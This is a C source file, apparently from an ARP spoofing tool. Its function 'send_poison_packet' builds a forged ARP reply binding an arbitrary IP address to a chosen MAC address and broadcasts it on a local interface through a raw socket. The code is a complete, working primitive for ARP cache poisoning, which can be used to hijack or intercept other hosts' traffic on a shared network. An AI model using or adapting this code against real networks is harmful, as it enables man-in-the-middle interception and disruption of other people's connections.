#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <net/if.h>
#include <sys/socket.h>
#include <unistd.h>

#include <netinet/ether.h>
#include <netpacket/packet.h>
#include <sys/ioctl.h>

#include <arpa/inet.h>

#include "poison.h"

void printChar(char *s, int len) {
	int i;
	for(i=0;i<len;i++)
	{
		if(i>0 && i % 8 == 0)
			printf("\n");
		printf("%2x ",s[i] & 0xff);
	}
	printf("\n");
}


static int
build_packet(struct ether_addr *mac_addr,
             struct in_addr *ip_addr,
             unsigned char *packet)
{
	int i=0;

	memcpy(packet+i, "\xff\xff\xff\xff\xff\xff", 6);
	i+=6;
	memcpy(packet+i, mac_addr, 6);
	i+=6;
	memcpy(packet+i, "\x08\x06", 2);
	i+=2;

	memcpy(packet+i, "\x00\x01\x08\x00\x06\x04", 6);
	i+=6;
	memcpy(packet+i, "\x00\x02", 2);
	i+=2;
	
	memcpy(packet+i, mac_addr, 6);
	i+=6;
	memcpy(packet+i, ip_addr, 4);
	i+=4;
	memcpy(packet+i, mac_addr, 6);
	i+=6;
	memcpy(packet+i, ip_addr, 4);
	i+=4;
	return i;
}
int
send_poison_packet(struct in_addr *ip_addr, struct ether_addr *mac_addr, const char *ifname_in)
{
    int sock;
    struct sockaddr_ll dst_sockaddr;
    const char *ifname = ifname_in == NULL ? "eth0" : ifname_in;
    unsigned char *packet;
    int packet_sz;

    sock = socket(PF_PACKET, SOCK_RAW, 0);
    if (sock < 0)
        return -1;

    // Drop root privileges if the executable is suid root
    if (setuid(getuid()) < 0)
        return -1;

	if(mac_addr == NULL) {
		mac_addr = (struct ether_addr *)malloc(sizeof(struct ether_addr));

        struct ifreq ifr;

        strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
        if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0)
            return -1;
        memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6);
    }

    // Build the magic packet
    packet = (unsigned char *) malloc(200);
    if (packet == NULL)
        return -1;
    packet_sz = build_packet(mac_addr,
                             ip_addr,
                             packet);

    // Make dst_sockaddr for sendto()
    {
        struct ifreq ifr;

        strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
        if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0)
            return -1;

        memset(&dst_sockaddr, 0, sizeof(dst_sockaddr));
        dst_sockaddr.sll_family = AF_PACKET;
        dst_sockaddr.sll_ifindex = ifr.ifr_ifindex;
        dst_sockaddr.sll_halen = 6;
        memcpy(dst_sockaddr.sll_addr, "\xff\xff\xff\xff\xff\xff" , 6);
    }

	printChar(packet, packet_sz);

    // Finally, send the packet!
	int i;
	for(i=0;i<1;i++) {
    if (sendto(sock, packet, packet_sz, 0, (struct sockaddr *) &dst_sockaddr,
               sizeof(dst_sockaddr)) < 0)
        return -1;
	}

    free(packet);

    return 0;
}

